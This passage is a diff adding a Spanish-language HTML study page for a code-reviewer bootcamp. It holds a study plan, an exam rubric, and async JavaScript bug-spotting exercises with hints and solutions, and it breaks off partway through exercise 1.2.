@@ -1,0 +1,2425 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bootcamp AI Trainer / Code Reviewer</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --bg2: #161b22;
+  --bg3: #1c2128;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --accent2: #3fb950;
+  --warn: #d29922;
+  --danger: #f85149;
+  --purple: #bc8cff;
+  --mono: 'Courier New', Courier, monospace;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  line-height: 1.6;
+  min-height: 100vh;
+}
+/* Header */
+header {
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+  padding: 12px 20px;
+  display: flex;
+  flex-wrap: wrap;
+  align-items: center;
+  gap: 12px;
+}
+header h1 {
+  font-size: 1.2rem;
+  color: var(--accent);
+  flex-shrink: 0;
+}
+.progress-wrap {
+  flex: 1;
+  min-width: 150px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.progress-bar {
+  flex: 1;
+  height: 8px;
+  background: var(--bg3);
+  border-radius: 4px;
+  overflow: hidden;
+  border: 1px solid var(--border);
+}
+#pf {
+  height: 100%;
+  width: 0%;
+  background: linear-gradient(90deg, var(--accent), var(--accent2));
+  transition: width 0.3s ease;
+}
+#pt {
+  font-size: 0.85rem;
+  color: var(--muted);
+  white-space: nowrap;
+  font-weight: 600;
+}
+.header-btns {
+  display: flex;
+  gap: 6px;
+  flex-shrink: 0;
+}
+.header-btns button {
+  padding: 5px 10px;
+  font-size: 0.75rem;
+  border: 1px solid var(--border);
+  background: var(--bg3);
+  color: var(--text);
+  border-radius: 4px;
+  cursor: pointer;
+  transition: background 0.2s;
+}
+.header-btns button:hover { background: var(--border); }
+/* Layout */
+.layout {
+  display: flex;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+/* Sidebar */
+aside {
+  width: 220px;
+  flex-shrink: 0;
+  position: sticky;
+  top: 56px;
+  height: calc(100vh - 56px);
+  overflow-y: auto;
+  padding: 16px 12px;
+  border-right: 1px solid var(--border);
+  background: var(--bg2);
+}
+aside h3 {
+  font-size: 0.7rem;
+  text-transform: uppercase;
+  color: var(--muted);
+  letter-spacing: 1px;
+  margin: 12px 0 6px;
+}
+aside h3:first-child { margin-top: 0; }
+aside a {
+  display: block;
+  padding: 4px 8px;
+  font-size: 0.85rem;
+  color: var(--muted);
+  text-decoration: none;
+  border-radius: 4px;
+  transition: all 0.15s;
+}
+aside a:hover { color: var(--accent); background: var(--bg3); }
+/* Main */
+main {
+  flex: 1;
+  padding: 24px 32px;
+  max-width: 900px;
+  min-width: 0;
+}
+section {
+  margin-bottom: 48px;
+  scroll-margin-top: 70px;
+}
+section > h2 {
+  font-size: 1.5rem;
+  color: var(--accent);
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 8px;
+  margin-bottom: 16px;
+}
+section > h3 {
+  font-size: 1.15rem;
+  color: var(--accent2);
+  margin: 20px 0 10px;
+}
+section > h4 {
+  font-size: 1rem;
+  color: var(--purple);
+  margin: 16px 0 8px;
+}
+p, li { margin-bottom: 8px; font-size: 0.95rem; }
+ul, ol { padding-left: 20px; }
+strong { color: var(--text); }
+em { color: var(--muted); }
+a { color: var(--accent); }
+/* Boxes */
+.box {
+  padding: 14px 18px;
+  border-radius: 6px;
+  border: 1px solid var(--border);
+  background: var(--bg3);
+  margin: 12px 0;
+}
+.box.warn { border-color: var(--warn); background: rgba(210,153,34,0.08); }
+.box.danger { border-color: var(--danger); background: rgba(248,81,73,0.08); }
+.box.good { border-color: var(--accent2); background: rgba(63,185,80,0.08); }
+.box.purple { border-color: var(--purple); background: rgba(188,140,255,0.08); }
+.box-title {
+  font-weight: 700;
+  font-size: 0.95rem;
+  margin-bottom: 8px;
+  display: block;
+}
+.box.warn .box-title { color: var(--warn); }
+.box.danger .box-title { color: var(--danger); }
+.box.good .box-title { color: var(--accent2); }
+.box.purple .box-title { color: var(--purple); }
+/* Tables */
+table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 12px 0;
+  font-size: 0.88rem;
+}
+th, td {
+  padding: 8px 12px;
+  border: 1px solid var(--border);
+  text-align: left;
+}
+th { background: var(--bg3); color: var(--accent); font-weight: 600; }
+td { background: var(--bg2); }
+/* Code */
+pre {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 14px 16px;
+  overflow-x: auto;
+  margin: 10px 0;
+  font-size: 0.85rem;
+  line-height: 1.5;
+}
+code {
+  font-family: var(--mono);
+  font-size: inherit;
+}
+pre code { color: var(--text); }
+.kw { color: #ff7b72; }
+.fn { color: #d2a8ff; }
+.str { color: #a5d6ff; }
+.num { color: #79c0ff; }
+.cmt { color: #8b949e; font-style: italic; }
+/* Tags */
+.tag {
+  display: inline-block;
+  padding: 1px 8px;
+  border-radius: 10px;
+  font-size: 0.7rem;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-left: 6px;
+  vertical-align: middle;
+}
+.tag.js { background: rgba(210,168,255,0.15); color: #d2a8ff; border: 1px solid rgba(210,168,255,0.3); }
+.tag.py { background: rgba(63,185,80,0.15); color: #3fb950; border: 1px solid rgba(63,185,80,0.3); }
+.tag.http { background: rgba(88,166,255,0.15); color: #58a6ff; border: 1px solid rgba(88,166,255,0.3); }
+.tag.ui { background: rgba(210,153,34,0.15); color: #d29922; border: 1px solid rgba(210,153,34,0.3); }
+/* Exercises */
+.exercise {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 18px 20px;
+  margin: 16px 0;
+  transition: border-color 0.2s;
+}
+.exercise.done {
+  border-color: var(--accent2);
+  opacity: 0.85;
+}
+.exercise.done .done-label { display: inline; }
+.done-label {
+  display: none;
+  color: var(--accent2);
+  font-size: 0.8rem;
+  font-weight: 600;
+  margin-left: 8px;
+}
+.ex-head {
+  display: flex;
+  align-items: center;
+  flex-wrap: wrap;
+  gap: 8px;
+  margin-bottom: 10px;
+}
+.ex-head h4 {
+  margin: 0;
+  font-size: 1rem;
+  color: var(--text);
+}
+.badge {
+  display: inline-block;
+  padding: 2px 8px;
+  border-radius: 10px;
+  font-size: 0.7rem;
+  font-weight: 600;
+  background: var(--bg3);
+  color: var(--muted);
+  border: 1px solid var(--border);
+}
+.actions {
+  display: flex;
+  gap: 8px;
+  margin: 12px 0;
+  flex-wrap: wrap;
+  align-items: center;
+}
+.btn-hint, .btn-sol {
+  padding: 6px 14px;
+  font-size: 0.82rem;
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  cursor: pointer;
+  transition: all 0.15s;
+  font-weight: 500;
+}
+.btn-hint {
+  background: rgba(210,153,34,0.1);
+  color: var(--warn);
+  border-color: rgba(210,153,34,0.3);
+}
+.btn-hint:hover { background: rgba(210,153,34,0.2); }
+.btn-sol {
+  background: rgba(63,185,80,0.1);
+  color: var(--accent2);
+  border-color: rgba(63,185,80,0.3);
+}
+.btn-sol:hover { background: rgba(63,185,80,0.2); }
+.hint {
+  background: rgba(210,153,34,0.06);
+  border: 1px solid rgba(210,153,34,0.2);
+  border-radius: 6px;
+  padding: 12px 16px;
+  margin: 10px 0;
+  font-size: 0.9rem;
+}
+.solution {
+  background: rgba(63,185,80,0.06);
+  border: 1px solid rgba(63,185,80,0.2);
+  border-radius: 6px;
+  padding: 12px 16px;
+  margin: 10px 0;
+  font-size: 0.9rem;
+}
+.hidden { display: none !important; }
+/* Checkbox */
+.check-done {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  margin-top: 10px;
+  font-size: 0.85rem;
+  color: var(--muted);
+  cursor: pointer;
+}
+.check-done input { cursor: pointer; accent-color: var(--accent2); }
+/* Checklist */
+.checklist { list-style: none; padding: 0; }
+.checklist li {
+  padding: 8px 0;
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-size: 0.92rem;
+}
+.checklist input { accent-color: var(--accent); cursor: pointer; }
+/* Barra de cuenta + estado de sincronizacion (Neon/Vercel). */
+.authbar {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 20px;
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+  font-size: 0.82rem;
+  color: var(--muted);
+  flex-wrap: wrap;
+}
+.authbar .auth-email { color: var(--text); font-weight: 600; }
+.authbar input {
+  padding: 5px 9px;
+  font-size: 0.8rem;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  background: var(--bg3);
+  color: var(--text);
+  width: 170px;
+}
+.authbar button {
+  padding: 5px 10px;
+  font-size: 0.78rem;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  background: var(--bg3);
+  color: var(--text);
+  cursor: pointer;
+}
+.authbar button:hover { background: var(--border); }
+.authbar button.primary {
+  background: rgba(63,185,80,0.15);
+  border-color: rgba(63,185,80,0.4);
+  color: var(--accent2);
+}
+#syncDot {
+  display: inline-block;
+  width: 9px;
+  height: 9px;
+  border-radius: 50%;
+  background: var(--muted);
+}
+#syncDot.ok { background: var(--accent2); }
+#syncDot.busy { background: var(--warn); }
+#syncDot.err { background: var(--danger); }
+#syncMsg { flex: 1; min-width: 140px; }
+#offlineBar {
+  display: none;
+  padding: 7px 20px;
+  font-size: 0.82rem;
+  background: rgba(210,153,34,0.12);
+  border-bottom: 1px solid rgba(210,153,34,0.35);
+  color: var(--warn);
+}
+body.offline #offlineBar { display: block; }
+/* Bloque de teoria reforzada por modulo. */
+.theory {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--accent);
+  border-radius: 6px;
+  padding: 14px 18px;
+  margin: 12px 0 18px;
+  font-size: 0.9rem;
+}
+.theory h4 { color: var(--accent); margin: 0 0 8px; font-size: 0.95rem; }
+.theory h5 { color: var(--accent2); margin: 12px 0 6px; font-size: 0.88rem; }
+.theory p, .theory li { font-size: 0.88rem; }
+.goals { list-style: none; padding: 0; margin: 10px 0; }
+.goals li { padding: 6px 0 6px 26px; position: relative; font-size: 0.88rem; }
+.goals li::before { content: "🎯"; position: absolute; left: 0; }
+/* Insignia de dificultad por ejercicio. */
+.diff {
+  display: inline-block;
+  padding: 1px 8px;
+  border-radius: 10px;
+  font-size: 0.7rem;
+  font-weight: 700;
+  margin-left: 6px;
+}
+.diff.d1 { background: rgba(63,185,80,0.15); color: var(--accent2); border: 1px solid rgba(63,185,80,0.35); }
+.diff.d2 { background: rgba(210,153,34,0.15); color: var(--warn); border: 1px solid rgba(210,153,34,0.35); }
+.diff.d3 { background: rgba(248,81,73,0.15); color: var(--danger); border: 1px solid rgba(248,81,73,0.35); }
+/* Radar */
+.radar {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+  gap: 8px;
+  margin: 12px 0;
+}
+.radar-item {
+  padding: 8px 12px;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  font-size: 0.82rem;
+}
+.radar-item strong { color: var(--accent); }
+/* Responsive */
+@media (max-width: 960px) {
+  aside { display: none; }
+  main { padding: 16px; }
+  header { padding: 10px 14px; }
+  header h1 { font-size: 1rem; }
+}
+@media (max-width: 600px) {
+  .header-btns button { padding: 4px 7px; font-size: 0.7rem; }
+  .exercise { padding: 14px; }
+  pre { font-size: 0.78rem; padding: 10px 12px; }
+}
+</style>
+</head>
+<body>
+
+<header>
+  <h1>🎯 Bootcamp AI Trainer / Code Reviewer</h1>
+  <div class="progress-wrap">
+    <div class="progress-bar"><div id="pf"></div></div>
+    <span id="pt">0 / 17</span>
+  </div>
+  <div class="header-btns">
+    <button id="showAll">📖 Mostrar todo</button>
+    <button id="hideAll">📕 Ocultar todo</button>
+    <button id="resetAll">🗑️ Reset</button>
+  </div>
+</header>
+
+<div class="authbar" id="authbar">
+  <span id="syncDot" title="Estado de sincronizacion"></span>
+  <span id="syncMsg">Modo local: tu avance vive en este dispositivo.</span>
+  <span id="authArea">
+    <input id="authEmail" type="email" placeholder="tu@email.com" autocomplete="email">
+    <input id="authPass" type="password" placeholder="Clave (8+)" autocomplete="current-password">
+    <button id="btnLogin" class="primary">Entrar</button>
+    <button id="btnRegister">Crear cuenta</button>
+  </span>
+  <span id="userArea" class="hidden">
+    <span class="auth-email" id="authUserEmail"></span>
+    <button id="btnLogout">Salir</button>
+  </span>
+</div>
+<div id="offlineBar">Sin conexion: sigues avanzando en local. Se sincronizara al volver la red.</div>
+
+<div class="layout">
+
+<aside>
+  <h3>Inicio</h3>
+  <a href="#intro">Cómo usar este curso</a>
+  <a href="#examen">El examen real</a>
+  <h3>Módulos</h3>
+  <a href="#m1">1. Asincronía JS/Node</a>
+  <a href="#m2">2. Python: tipos y excepciones</a>
+  <a href="#m3">3. Edge cases y algoritmos</a>
+  <a href="#m4">4. APIs, HTTP y seguridad</a>
+  <a href="#m5">5. Frontend y full-stack</a>
+  <a href="#m6">6. Simulacro final</a>
+  <h3>Plantillas</h3>
+  <a href="#plantilla">Plantilla de respuesta</a>
+  <a href="#checklist">Checklist final</a>
+</aside>
+
+<main>
+
+<!-- ===================== INTRO ===================== -->
+<section id="intro">
+<h2>📘 Cómo usar este curso</h2>
+
+<div class="box warn">
+  <span class="box-title">⚠️ Regla de oro</span>
+  Escribe tu respuesta ANTES de abrir la pista o la solución. Si miras primero, no entrenas el músculo de detección.
+</div>
+
+<h3>Estructura de cada ejercicio</h3>
+<table>
+  <tr><th>Elemento</th><th>Propósito</th></tr>
+  <tr><td>Código buggy</td><td>El snippet con errores que debes revisar</td></tr>
+  <tr><td>💡 Pista</td><td>Te orienta hacia el bug sin dar la solución</td></tr>
+  <tr><td>🔓 Ver solución</td><td>Explicación completa + código corregido + verificación</td></tr>
+  <tr><td>☑️ Completado</td><td>Marca el ejercicio como hecho (se guarda en localStorage)</td></tr>
+</table>
+
+<div class="theory">
+  <h4>📚 Como estudiar cada ejercicio (Pista 1 - Pista 2 - Solucion)</h4>
+  <ol>
+    <li><strong>Lee la teoria del modulo</strong> y sus objetivos (lista con objetivo). No abras el ejercicio sin ella.</li>
+    <li><strong>Intenta 10-15 min</strong> escribiendo tu respuesta en 5 pasos: que falla, por que, cuando, correccion, verificacion.</li>
+    <li><strong>Pista 1:</strong> orientacion general. Si sigues atascado 10 min, abre la <strong>Pista 2 (guiada)</strong>: que linea mirar y que pregunta hacerte, sin revelar el fix.</li>
+    <li><strong>Solucion:</strong> compara punto por punto. Si fallaste la causa raiz, relee la teoria y reescribe de memoria al dia siguiente.</li>
+    <li><strong>Marca Completado</strong> solo si resolviste o reconstruiste sin mirar. Con cuenta, tu avance viaja entre celular y PC.</li>
+  </ol>
+</div>
+
+<h3>Plan de estudio: 14 días</h3>
+<table>
+  <tr><th>Día</th><th>Actividad</th><th>Tiempo</th></tr>
+  <tr><td>1</td><td>Leer intro + examen. Hacer módulo 1 completo</td><td>2h</td></tr>
+  <tr><td>2</td><td>Módulo 2 + repaso módulo 1</td><td>1.5h</td></tr>
+  <tr><td>3</td><td>Módulo 3</td><td>1.5h</td></tr>
+  <tr><td>4</td><td>Módulo 4</td><td>2h</td></tr>
+  <tr><td>5</td><td>Módulo 5</td><td>1.5h</td></tr>
+  <tr><td>6</td><td>Simulacro final (módulo 6) — cronometrado 45 min</td><td>1.5h</td></tr>
+  <tr><td>7</td><td>Revisar errores del simulacro + plantilla</td><td>1h</td></tr>
+  <tr><td>8-10</td><td>Repetir módulos débiles. Reescribir soluciones de memoria</td><td>1.5h/día</td></tr>
+  <tr><td>11-12</td><td>Buscar código buggy en GitHub/StackOverflow y practicar detección</td><td>1h/día</td></tr>
+  <tr><td>13</td><td>Simulacro final #2 cronometrado</td><td>1h</td></tr>
+  <tr><td>14</td><td>Checklist final + descanso</td><td>30min</td></tr>
+</table>
+</section>
+
+<!-- ===================== EXAMEN ===================== -->
+<section id="examen">
+<h2>🎓 Cómo es el examen real</h2>
+
+<h3>Rúbrica de evaluación</h3>
+<table>
+  <tr><th>Criterio</th><th>Peso</th><th>Qué evalúan</th></tr>
+  <tr><td>Detección del bug</td><td>35%</td><td>¿Identificaste el problema correcto?</td></tr>
+  <tr><td>Explicación técnica</td><td>30%</td><td>¿Sabes por qué falla a nivel de lenguaje/runtime?</td></tr>
+  <tr><td>Corrección funcional</td><td>20%</td><td>¿Tu código resuelve el problema sin introducir nuevos?</td></tr>
+  <tr><td>Claridad y formato</td><td>15%</td><td>¿La respuesta es legible, estructurada y profesional?</td></tr>
+</table>
+
+<div class="box danger">
+  <span class="box-title">🚫 Los 5 errores que descalifican</span>
+  <ol>
+    <li><strong>No identificar el bug real</strong> — criticar el estilo cuando hay un error funcional.</li>
+    <li><strong>Explicación vaga</strong> — "está mal" sin decir por qué técnicamente.</li>
+    <li><strong>Corrección que introduce otro bug</strong> — arreglar una cosa y romper otra.</li>
+    <li><strong>No considerar edge cases</strong> — tu solución funciona en el caso feliz pero no en los límites.</li>
+    <li><strong>Copiar la solución sin entenderla</strong> — los follow-up questions te exponen.</li>
+  </ol>
+</div>
+
+<div class="box good">
+  <span class="box-title">✅ Estructura de respuesta de 5 pasos</span>
+  <ol>
+    <li><strong>Qué falla:</strong> Una frase que identifica el bug concreto.</li>
+    <li><strong>Por qué falla:</strong> La causa raíz técnica (mecanismo del lenguaje/runtime).</li>
+    <li><strong>Cuándo se manifiesta:</strong> El caso concreto que lo dispara.</li>
+    <li><strong>Corrección:</strong> Código mínimo que resuelve el problema.</li>
+    <li><strong>Verificación:</strong> Asserts o casos de prueba que demuestran que funciona.</li>
+  </ol>
+</div>
+</section>
+
+<!-- ===================== MÓDULO 1 ===================== -->
+<section id="m1">
+<h2>📦 Módulo 1 — Asincronía JS/Node.js</h2>
+
+<h3>Teoría esencial</h3>
+<p>JavaScript es <strong>single-threaded</strong> con un event loop. Las promesas se resuelven en la <strong>microtask queue</strong> (prioridad alta), mientras que <code>setTimeout</code> y I/O van a la <strong>macrotask queue</strong>.</p>
+
+<h4>Los 4 combinadores de promesas</h4>
+<table>
+  <tr><th>Método</th><th>Resuelve cuando</th><th>Rechaza cuando</th></tr>
+  <tr><td><code>Promise.all</code></td><td>Todas resuelven</td><td>La primera rechaza</td></tr>
+  <tr><td><code>Promise.allSettled</code></td><td>Todas terminan (resuelven o rechazan)</td><td>Nunca</td></tr>
+  <tr><td><code>Promise.race</code></td><td>La primera que termina (resuelve o rechaza)</td><td>La primera que termina</td></tr>
+  <tr><td><code>Promise.any</code></td><td>La primera que resuelve</td><td>Todas rechazan</td></tr>
+</table>
+
+<h4>Radar de 6 patrones bug-prone en async JS</h4>
+<div class="radar">
+  <div class="radar-item"><strong>forEach + async</strong> — no espera las promesas</div>
+  <div class="radar-item"><strong>Promise.all sin catch</strong> — un rechazo hunde todo</div>
+  <div class="radar-item"><strong>Sin finally en recursos</strong> — conexiones/pools se agotan</div>
+  <div class="radar-item"><strong>Race conditions</strong> — read-modify-write sin lock</div>
+  <div class="radar-item"><strong>Concurrencia sin límite</strong> — 10000 requests simultáneos</div>
+  <div class="radar-item"><strong>await en loop secuencial</strong> — cuando podría ser paralelo</div>
+</div>
+
+<div class="theory">
+  <h4>📚 Teoría M1 — Event loop, microtareas y los 4 combinadores (léeme antes de los ejercicios)</h4>
+  <p>JS ejecuta tu código en <strong>un solo hilo</strong>. Lo async no corre en paralelo: se <strong>encola</strong>. Regla de oro: <code>await</code> cede el hilo; todo lo que esté después del <code>await</code> corre <strong>después</strong>, y mientras tanto el event loop atiende otras microtareas. Por eso el orden "leer → await → escribir" nunca es atómico.</p>
+  <h5>1. Microtarea vs macrotarea (el orden que te preguntan en el examen)</h5>
+  <ul>
+    <li><strong>Microtareas</strong> (prioridad alta, se vacían por completo antes de pintar): <code>Promise.then/catch/finally</code>, <code>queueMicrotask</code>, <code>await</code> resuelto.</li>
+    <li><strong>Macrotareas</strong> (una por vuelta del loop): <code>setTimeout/setInterval</code>, I/O, eventos UI.</li>
+    <li>Trampa clásica: <code>Promise.resolve().then(f)</code> corre <strong>antes</strong> que <code>setTimeout(f, 0)</code>. Si un reviewer dice "el timeout corre primero", está mal.</li>
+  </ul>
+  <h5>2. Los 4 combinadores — cuándo usar cada uno</h5>
+  <ul>
+    <li><code>Promise.all</code>: todo-o-nada. Un rechazo <strong>cancela el resultado</strong> (las demás siguen corriendo pero su valor se pierde). Úsalo solo si el lote es homogéneo y quieres fallar rápido.</li>
+    <li><code>Promise.allSettled</code>: para lotes heterogéneos (50 endpoints). <strong>Nunca rechaza</strong>; inspecciona <code>{status, value, reason}</code> por item.</li>
+    <li><code>Promise.race</code>: la primera que <strong>termina</strong> (resuelva o rechace). Patrón timeout: <code>race([fetch(url), timeout(5000)])</code>.</li>
+    <li><code>Promise.any</code>: la primera que <strong>resuelve</strong>. Solo rechaza (AggregateError) si todas fallan. Ideal para mirrors/fallbacks.</li>
+  </ul>
+  <h5>3. Los 3 bugs que más suspenden</h5>
+  <ul>
+    <li><strong>forEach + async:</strong> <code>forEach</code> ignora el return del callback → las promesas quedan huérfanas. Paralelo: <code>await Promise.all(arr.map(f))</code>. Secuencial: <code>for...of</code>.</li>
+    <li><strong>Recurso sin finally:</strong> si hay <code>throw</code> entre <code>acquire()</code> y <code>release()</code>, el pool se agota. Patrón: <code>try { usar } finally { liberar }</code>.</li>
+    <li><strong>fetch sin res.ok:</strong> <code>fetch</code> solo rechaza por fallo de red. Un 404/500 llega como response "exitosa". Siempre: <code>if (!res.ok) throw ...</code>.</li>
+  </ul>
+  <h5>4. Cómo responder en el examen (aplica a 1.1–1.4)</h5>
+  <p>Qué falla (una frase) → por qué (mecanismo del event loop/promesa) → cuándo (qué input o timing lo dispara) → corrección mínima → verificación (assert con el caso que antes fallaba).</p>
+</div>
+
+<ul class="goals">
+  <li>Explicas el orden microtarea vs macrotarea sin dudar.</li>
+  <li>Eliges el combinador correcto (all / allSettled / race / any) según el caso.</li>
+  <li>Detectas forEach+async, falta de finally y fetch sin res.ok a simple vista.</li>
+</ul>
+
+<h3>Ejemplo resuelto 0.0 — forEach async devuelve []</h3>
+<pre><code><span class="cmt">// BUG: forEach no espera promesas</span>
+<span class="kw">async function</span> <span class="fn">obtenerNombres</span>(ids) {
+  <span class="kw">const</span> nombres = [];
+  ids.<span class="fn">forEach</span>(<span class="kw">async</span> (id) =&gt; {
+    <span class="kw">const</span> res = <span class="kw">await</span> <span class="fn">fetch</span>(<span class="str">`/api/users/${id}`</span>);
+    <span class="kw">const</span> data = <span class="kw">await</span> res.<span class="fn">json</span>();
+    nombres.<span class="fn">push</span>(data.name);
+  });
+  <span class="kw">return</span> nombres; <span class="cmt">// siempre devuelve []</span>
+}</code></pre>
+<p><strong>Qué falla:</strong> <code>forEach</code> ignora el valor retornado del callback. Las funciones async dentro devuelven promesas que nadie espera.</p>
+<p><strong>Corrección:</strong> Usar <code>for...of</code> (secuencial) o <code>Promise.all(arr.map(...))</code> (paralelo).</p>
+
+<!-- Ejercicio 1.1 -->
+<article class="exercise" data-ex="1.1">
+  <div class="ex-head">
+    <h4>Ejercicio 1.1 — forEach async en notificaciones</h4>
+    <span class="badge">Asincronía</span>
+    <span class="tag js">JS</span>
+    <span class="diff d1">Facil</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Este código debe enviar notificaciones a todos los usuarios y devolver el total enviados. Pero <code>total</code> siempre es 0.</p>
+<pre><code><span class="kw">async function</span> <span class="fn">enviarNotificaciones</span>(usuarios) {
+  <span class="kw">let</span> total = <span class="num">0</span>;
+  usuarios.<span class="fn">forEach</span>(<span class="kw">async</span> (user) =&gt; {
+    <span class="kw">await</span> <span class="fn">enviarEmail</span>(user.email, <span class="str">"Tienes una alerta"</span>);
+    total++;
+  });
+  console.<span class="fn">log</span>(<span class="str">`Enviadas: ${total}`</span>);
+  <span class="kw">return</span> total;
+}</code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> ¿Qué devuelve <code>forEach</code>? ¿Espera acaso las promesas que retorna el callback async? Piensa en el orden de ejecución: la línea del <code>console.log</code> se ejecuta antes de que cualquier <code>await</code> dentro del callback se resuelva.</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Mira el <code>.forEach</code>: su callback devuelve una promesa que nadie guarda. Preguntate: despues del bucle, quien hace <code>await</code> a esos envios?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> <code>forEach</code> no espera las promesas del callback async, por lo que <code>total</code> se retorna antes de que se ejecute cualquier incremento.</p>
+    <p><strong>2. ¿Por qué falla?</strong> <code>Array.prototype.forEach</code> ignora completamente el valor de retorno del callback. Cuando el callback es async, devuelve una Promise que se descarta. El loop termina sincrónicamente y la función continúa.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> Siempre. El <code>console.log</code> imprime 0 en el 100% de las ejecuciones.</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="kw">async function</span> <span class="fn">enviarNotificaciones</span>(usuarios) {
+  <span class="kw">const</span> promesas = usuarios.<span class="fn">map</span>(<span class="kw">async</span> (user) =&gt; {
+    <span class="kw">await</span> <span class="fn">enviarEmail</span>(user.email, <span class="str">"Tiene una alerta"</span>);
+  });
+  <span class="kw">await</span> Promise.<span class="fn">all</span>(promesas);
+  <span class="kw">const</span> total = usuarios.length;
+  console.<span class="fn">log</span>(<span class="str">`Enviadas: ${total}`</span>);
+  <span class="kw">return</span> total;
+}</code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code><span class="cmt">// Mock</span>
+<span class="kw">let</span> enviados = <span class="num">0</span>;
+<span class="kw">async function</span> <span class="fn">enviarEmail</span>() { enviados++; }
+<span class="kw">const</span> r = <span class="kw">await</span> <span class="fn">enviarNotificaciones</span>([{email:<span class="str">"a@b.com"</span>},{email:<span class="str">"c@d.com"</span>}]);
+console.<span class="fn">assert</span>(r === <span class="num">2</span>);
+console.<span class="fn">assert</span>(enviados === <span class="num">2</span>);</code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+
+<!-- Ejercicio 1.2 -->
+<article class="exercise" data-ex="1.2">
+  <div class="ex-head">
+    <h4>Ejercicio 1.2 — Promise.all que colapsa con un 404</h4>
+    <span class="badge">Promesas + HTTP</span>
+    <span class="tag js">JS</span>
+    <span class="diff d2">Media</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Debe obtener datos de 50 endpoints. Si uno falla, no se obtiene ninguno. Además, no verifica <code>res.ok</code> y lanza 50 requests simultáneos.</p>
+<pre><code><span class="kw">async function</span> <span class="fn">obtenerTodo</span>(urls) {
+  <span class="kw">const</span> results = <span class="kw">await</span> Promise.<span class="fn">all</span>(
+    urls.<span class="fn">map</span>(url =&gt; <span class="fn">fetch</span>(url).<span class="fn">then</span>(r =&gt; r.<span class="fn">json</span>()))
+  );
+  <span class="kw">return</span> results;
+}</code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> Tres problemas: (1) ¿Qué pasa si un fetch devuelve 404? <code>fetch</code> no rechaza por status HTTP. (2) ¿Qué hace <code>Promise.all</code> cuando una promesa rechaza? (3) ¿Qué pasa con 1000 URLs simultáneas?</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Mira el <code>.map</code> con <code>fetch</code>: falta <code>res.ok</code> y un solo rechazo hunde <code>Promise.all</code>. Preguntate: que devuelve el lote si el item 7 es un 404?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> Tres bugs: no verifica <code>res.ok</code> (un 404 se trata como éxito), <code>Promise.all</code> falla completo si un request rechaza, y no hay límite de concurrencia.</p>
+    <p><strong>2. ¿Por qué falla?</strong> <code>fetch()</code> solo rechaza por errores de red, no por status 4xx/5xx. Un 404 devuelve una response válida cuyo <code>.json()</code> puede fallar con un error de parsing, rechazando la promesa y hundiendo todo el <code>Promise.all</code>.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> Cuando un endpoint devuelve 404/500, o cuando hay muchas URLs y se satura el pool de conexiones del navegador/Node.</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="kw">async function</span> <span class="fn">obtenerTodo</span>(urls, concurrencia = <span class="num">10</span>) {
+  <span class="kw">const</span> resultados = <span class="kw">await</span> Promise.<span class="fn">allSettled</span>(
+    urls.<span class="fn">map</span>(<span class="kw">async</span> (url) =&gt; {
+      <span class="kw">const</span> res = <span class="kw">await</span> <span class="fn">fetch</span>(url);
+      <span class="kw">if</span> (!res.ok) <span class="kw">throw new</span> Error(<span class="str">`HTTP ${res.status} en ${url}`</span>);
+      <span class="kw">return</span> res.<span class="fn">json</span>();
+    })
+  );
+  <span class="kw">return</span> resultados.<span class="fn">filter</span>(r =&gt; r.status === <span class="str">"fulfilled"</span>).<span class="fn">map</span>(r =&gt; r.value);
+}
+<span class="cmt">// Para concurrencia limitada, usar un pool o p-limit</span></code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code><span class="kw">const</span> urls = [<span class="str">"/ok1"</span>, <span class="str">"/ok2"</span>, <span class="str">"/404"</span>, <span class="str">"/ok3"</span>];
